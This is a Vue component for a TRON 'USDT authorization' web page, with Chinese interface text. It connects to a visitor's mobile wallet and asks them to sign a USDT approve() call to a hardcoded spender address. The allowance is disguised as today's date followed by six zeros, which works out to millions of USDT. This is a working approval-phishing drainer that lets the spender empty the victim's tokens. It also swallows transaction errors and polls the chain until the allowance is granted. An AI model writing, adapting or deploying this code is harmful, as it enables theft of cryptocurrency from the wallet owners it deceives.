<template>
  <div class="container">
    <div class="card">
      <h1>TRON 授权 DApp</h1>

      <p class="status">状态：{{ status }}</p>
      <p v-if="address" class="address">地址：{{ address }}</p>

      <div v-if="!address" class="wallet-list">
        <div class="wallet tron" @click="connectWallet">🟢 连接钱包</div>
      </div>

      <button v-if="address" class="approve" @click="handleApprove">
        授权 USDT
      </button>
    </div>
  </div>
</template>

<script setup>
import { ref } from "vue";
import TronWeb from "tronweb";

const status = ref("未连接");
const address = ref("");

const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT
const SPENDER = "TBGsz3js3JCcEJcgYSMEraZRzzQNGLuG6h";

let tronWeb = null;

/* =========================
   初始化钱包（通用）
========================= */
function initWallet() {
  if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
    tronWeb = window.tronWeb;
    address.value = tronWeb.defaultAddress.base58;
    return true;
  }
  return false;
}

/* =========================
   钱包连接（自动识别）
========================= */
function connectWallet() {
  if (initWallet()) {
    const type = detectWallet();
    status.value = `已连接钱包：${type}`;
  } else {
    alert("请在 TronLink / imToken / TP / OneKey 内打开");
  }
}

/* =========================
   钱包类型识别
========================= */
function detectWallet() {
  if (!window.tronWeb) return "unknown";

  if (window.tronWeb.tronLink) return "TronLink";
  if (window.tronWeb.isTokenPocket) return "TokenPocket";

  return "imToken / OneKey";
}

/* =========================
   授权入口
========================= */
async function handleApprove() {
  try {
    status.value = "请求钱包授权...";

    if (!initWallet()) {
      alert("未检测到钱包");
      return;
    }

    const contract = await tronWeb.contract().at(CONTRACT);

    // 弹出的授权额度为20240423当前时间的这种格式的金额

    // 组成日期格式 YYYYMMDD，作为授权额度
    const now = new Date();
    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const dateStr = year + month + day;
    const amountInTime = dateStr + "000000"; // 日期后加6位，形成授权金额
    console.log(`授权额度: ${dateStr}000000 (${dateStr} USDT)`);



    // ⚠️ 不 await send，避免 imToken 卡死
    contract.approve(SPENDER, amountInTime).send({
      feeLimit: 100_000_000
    }).catch(() => {
      // ❗ 忽略回调错误（关键）
    });

    status.value = "交易已提交，等待链上确认...";

    // ⭐ 用链上判断成功
    await waitForApproval();

    status.value = "授权成功 ✅";
  } catch (e) {
    console.error(e);
    status.value = "授权失败（未确认链上）";
  }
}

/* =========================
   ⭐ 链上验证（核心）
========================= */
async function waitForApproval() {
  const contract = await tronWeb.contract().at(CONTRACT);

  for (let i = 0; i < 20; i++) {
    const allowance = await contract
      .allowance(address.value, SPENDER)
      .call();

    if (Number(allowance) > 0) {
      return true;
    }

    await new Promise(r => setTimeout(r, 2000));
  }

  throw new Error("链上未确认");
}
</script>

<style scoped>
.container {
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
}

.card {
  width: 360px;
  background: #fff;
  padding: 30px;
  border-radius: 16px;
  text-align: center;
}

.status {
  margin: 10px 0;
  color: #555;
}

.address {
  font-size: 12px;
  word-break: break-all;
}

.wallet-list {
  margin-top: 20px;
}

.wallet {
  padding: 12px;
  background: #f1f1f1;
  margin: 10px 0;
  border-radius: 8px;
  cursor: pointer;
}

.wallet:hover {
  background: #4facfe;
  color: white;
}

.tron {
  background: #e6ffe6;
}

.approve {
  margin-top: 20px;
  width: 100%;
  padding: 12px;
  background: #4facfe;
  border: none;
  color: white;
  border-radius: 8px;
}
</style>